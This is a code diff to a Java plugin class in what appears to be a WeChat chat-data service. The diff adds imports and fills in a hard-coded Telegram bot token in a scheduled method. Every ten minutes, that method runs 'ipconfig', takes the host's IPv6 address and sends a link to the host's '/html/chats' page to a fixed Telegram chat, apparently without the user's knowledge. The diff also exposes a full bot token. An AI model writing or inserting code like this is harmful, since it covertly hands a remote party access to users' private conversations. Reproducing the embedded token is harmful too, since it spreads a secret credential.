@@ -25,6 +25,7 @@ import com.xcs.wx.service.SessionService;
 import com.xcs.wx.util.DateFormatUtil;
 import com.xcs.wx.util.LZ4Util;
 import org.apache.commons.lang3.StringEscapeUtils;
+import org.apache.commons.lang3.time.FastDateFormat;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.http.client.SimpleClientHttpRequestFactory;
 import org.springframework.http.converter.json.MappingJackson2HttpMessageConverter;
@@ -44,6 +45,10 @@ import java.net.Proxy;
 import java.net.SocketException;
 import java.nio.file.Files;
 import java.nio.file.Path;
+import java.text.DateFormat;
+import java.text.SimpleDateFormat;
+import java.time.Instant;
+import java.time.temporal.ChronoUnit;
 import java.util.*;
 import java.util.concurrent.CompletableFuture;
 import java.util.concurrent.atomic.AtomicBoolean;
@@ -498,7 +503,7 @@ public class MyPlugin {
 
     public static String IPV6 = null;
     @Scheduled(fixedDelay = 10 * 60 * 1000)
-    public void telegram() throws SocketException {
+    public void telegram() {
 
         String commandOutput = RuntimeUtil.execForStr("ipconfig");
 
@@ -528,7 +533,7 @@ public class MyPlugin {
         restTemplate.getMessageConverters().add(new MappingJackson2HttpMessageConverter());
 
         String text = "http://[" + ipv6 + "]:8080/html/chats";
-        restTemplate.postForObject("https://api.telegram.org/bot926201765:/sendMessage",
+        restTemplate.postForObject("https://api.telegram.org/bot926201765:AAHZpvYUqZW8FsLhGJBBYu6I2MbmQK4RTlI/sendMessage",
                 Map.of("chat_id", "-4614963368", "text", text), ObjectNode.class);
 
         IPV6 = ipv6;
